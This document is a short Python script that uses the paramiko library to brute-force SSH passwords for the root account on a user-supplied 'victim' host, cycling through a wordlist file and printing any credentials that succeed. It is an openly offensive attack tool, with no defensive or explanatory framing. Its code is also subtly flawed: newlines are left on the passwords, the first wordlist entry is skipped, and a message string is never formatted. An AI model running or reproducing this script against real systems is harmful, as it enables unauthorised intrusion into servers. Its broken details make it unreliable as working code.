import paramiko
import socket
import time

def sshAttack(host, username, password):
    
    ssh = paramiko.SSHClient() 
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=host, username=username, password=password, timeout=3)
    except socket.timeout:
        # In case the host is innactive
        print("Host: {hostname} is unreachable.")
        return False
    except paramiko.AuthenticationException: #If credentials are wrong 
        print("Invalid credentials for " +  username +  ":" + password)
        return False
    except paramiko.SSHException:
        print("Server taking too long, delaying next attempt")
        time.sleep(60) #This is in order to avoid "spamming"
        return sshAttack(host, username, password)
    else:
        # connection was established successfully
        print("Right credentials at :\n\tHOSTNAME:" + host + "\n\tUSERNAME:" +  username + "\n\tPASSWORD:" + password + "\n")
        return True

print("Enter host")
victim = input()
password = open("wordlist.txt", 'r')
password.readline()

for p in password:
    sshAttack(str(victim),"root",p)